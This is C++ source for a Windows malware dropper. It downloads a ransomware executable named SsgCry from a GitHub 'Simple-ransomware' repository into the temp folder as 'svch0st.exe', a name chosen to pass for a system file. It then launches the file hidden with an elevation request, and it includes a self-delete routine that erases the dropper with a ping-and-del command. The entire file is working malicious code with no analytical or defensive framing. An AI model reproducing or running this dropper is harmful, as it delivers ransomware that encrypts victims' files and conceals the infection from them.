#include <Windows.h>
#include <WinInet.h>
#include <shellapi.h>
#include <iostream>
#include <strsafe.h>

using namespace std;

#define SELF_REMOVE_STRING	TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"shell32.lib")

void deleteMe()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

DWORD Download(HINTERNET hInternet, char *pszURL, char *pszFileName, BYTE *pBuffer)
{
	HINTERNET hURL = InternetOpenUrl(hInternet, pszURL, NULL, 0, 0, 0);
	if (hURL == NULL) {
		InternetCloseHandle(hInternet);
		return -2;
	}

	HANDLE hFile = CreateFile(pszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return -3;

	DWORD dwSize = 2048;
	DWORD dwRead, dwWritten, dwTotalSize;

	bool bOK = HttpQueryInfo(hURL, HTTP_QUERY_CONTENT_LENGTH, pBuffer, &dwRead, NULL);
	if (!bOK) return -4;
	dwTotalSize = atoi((const char *)pBuffer);


	do {
		InternetQueryDataAvailable(hURL, &dwSize, 0, 0);
		InternetReadFile(hURL, pBuffer, dwSize, &dwRead);
		WriteFile(hFile, pBuffer, dwRead, &dwWritten, NULL);
	} while (dwRead != 0);

	InternetCloseHandle(hURL);
	CloseHandle(hFile);

	return dwTotalSize;
}

void FileExecute(const char *path)
{
	bool bShellExecute = FALSE;
	SHELLEXECUTEINFO stShellInfo = { sizeof(SHELLEXECUTEINFO) };

	stShellInfo.lpVerb = TEXT("runas");
	stShellInfo.lpFile = TEXT(path);
	stShellInfo.nShow = SW_HIDE;

	bShellExecute = ShellExecuteEx(&stShellInfo);

	if (!bShellExecute) {
		DWORD dwStatus = GetLastError();
		if (dwStatus == ERROR_CANCELLED) return;
		if (dwStatus == ERROR_FILE_NOT_FOUND) return;
	}
}

int main()
{
	HINTERNET hInternet = InternetOpen("SsgCry", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL) return 0;

	BYTE *pBuffer = new BYTE[1024 * 1024];
	DWORD dwTotalSize;

	char szMalPath[MAX_PATH];
	GetTempPath(MAX_PATH, szMalPath);

	char filename[] = "svch0st.exe";
	strncat_s(szMalPath, filename, MAX_PATH);

	cout << "[*] You should run as administrator...";

	dwTotalSize = Download(hInternet, (char *)"https://github.com/idioth/Simple-ransomware/raw/master/bin/SsgCry.exe", szMalPath, pBuffer);

	delete[] pBuffer;
	InternetCloseHandle(hInternet);

	FileExecute(szMalPath);

	return 0;
}